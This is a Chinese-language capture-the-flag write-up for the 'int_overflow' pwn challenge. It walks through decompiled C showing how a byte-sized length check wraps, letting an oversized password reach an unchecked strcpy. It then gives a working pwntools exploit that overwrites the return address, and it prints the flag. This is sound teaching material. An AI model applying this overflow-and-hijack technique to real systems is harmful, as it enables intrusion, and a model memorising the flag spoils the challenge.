# int_overflow

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=f02f26fc-60b2-46d5-8909-4fa8803d7f04_2)

这道题6级对得起那些只有4级但是随便挑一个都比这个难的pwn题吗？

不过还是要注意一下这道题的溢出上限和其他的不同。

```c
undefined4 main(void)
{
  int local_14 [2];
  undefined *local_c;
  local_c = &stack0x00000004;
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("---------------------");
  puts("~~ Welcome to CTF! ~~");
  puts("       1.Login       ");
  puts("       2.Exit        ");
  puts("---------------------");
  printf("Your choice:");
  __isoc99_scanf(&DAT_08048a27,local_14);
  if (local_14[0] == 1) {
    login();
  }
  else {
    if (local_14[0] == 2) {
      puts("Bye~");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    puts("Invalid Choice!");
  }
  return 0;
}
```

这也没啥分析的，看看login里有啥。

```c
void login(void)
{
  undefined local_22c [512];
  undefined local_2c [40];
  memset(local_2c,0,0x20);
  memset(local_22c,0,0x200);
  puts("Please input your username:");
  read(0,local_2c,0x19);
  printf("Hello %s\n",local_2c);
  puts("Please input your passwd:");
  read(0,local_22c,0x199);
  check_passwd(local_22c);
  return;
}
```

好像还是没东西，继续往check_passwd看看。

```c
void check_passwd(char *param_1)
{
  size_t sVar1;
  char local_18 [11];
  byte local_d;
  sVar1 = strlen(param_1);
  local_d = (byte)sVar1;
  if ((local_d < 4) || (8 < local_d)) {
    puts("Invalid Password");
    fflush(stdout);
  }
  else {
    puts("Success");
    fflush(stdout);
    strcpy(local_18,param_1);
  }
  return;
}
```

看到strcpy就该警觉起来了。典型危险函数，想要进到这个函数里就要绕过第一个if过滤。绕过过滤的条件是local_d，也就是param——我们输入的密码的长度大于4小于8。local_d也就是sVar1，sVar1是我们输入的密码的长度。题目已经说得很清楚了，int_overflow，很明显可以直接溢出。

我最开始没认真看，还以为溢出上限是2147483647。结果根本就发不出去，太长了。仔细看才发现存储长度的变量类型是byte。byte也就是一个字节，可存储8位无符号数，储存的数值范围为0-255。那只要strlen返回的长度超过5整个长度就会发生反转，重新变为0。懒得精确地算了，直接255+5绝对够了。

```python
from pwn import *
p=remote("61.147.171.105",58407)
overflowMax=260
payload=0x18*b'a'+p32(0x0804868b)
payload+=(overflowMax-len(payload))*b'a'
p.sendlineafter("Your choice:",'1')
p.sendlineafter("Please input your username:",'test')
p.sendlineafter("Please input your passwd:",payload)
print(p.recvall())
```

- ### Flag
  > cyberpeace{ad3d483d6b06be57ffd51630c887ede0}